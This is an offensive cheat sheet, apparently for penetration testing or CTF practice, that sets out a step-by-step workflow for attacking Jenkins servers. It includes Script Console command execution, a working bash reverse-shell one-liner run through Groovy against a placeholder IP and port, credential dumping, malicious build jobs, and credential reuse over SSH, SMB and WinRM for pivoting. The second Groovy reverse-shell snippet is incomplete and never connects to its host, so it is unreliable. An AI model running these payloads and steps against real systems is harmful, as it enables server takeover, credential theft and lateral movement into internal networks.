# Jenkins Enumeration & Exploitation

## Purpose

Workflow for identifying and exploiting Jenkins servers.

Core rules:

* Jenkins often allows command execution
* Script Console = instant RCE
* Credentials often exposed

---

## 0. Identify Jenkins

Look for:

* /jenkins
* :8080
* login page

---

## 1. Access Jenkins

```text
http://<IP>:8080
```

---

## 2. Anonymous Access

Check:

* dashboard access
* job listings

---

## 3. Script Console (CRITICAL)

```text
Manage Jenkins → Script Console
```

Run:

```groovy
println "whoami".execute().text
```

---

## 4. Reverse Shell

```groovy
def proc = "bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'".execute()
```

---

## 5. Credentials Dump

```text
Manage Jenkins → Credentials
```

---

## 6. Build Job Exploitation

Create job → Execute shell:

```bash
whoami
```

---

## 7. Groovy Reverse Shell

```groovy
String host="<IP>";
int port=<PORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
```

---

## 8. Credential Reuse

Test Jenkins creds on:

* SSH
* SMB
* WinRM

---

## 9. File Access

Check:

* workspace
* config files
* secrets

---

## 10. Pivot Opportunities

Jenkins can give:

* system shell
* credentials
* internal access

---

## 11. If Stuck

* check anonymous access
* try script console
* create build job

---

## 12. Mental Model

* Jenkins = execution engine
* Console = shell
* Jobs = command execution

---

## 13. Golden Rules

* Always check script console
* Always check credentials
* Always attempt command execution
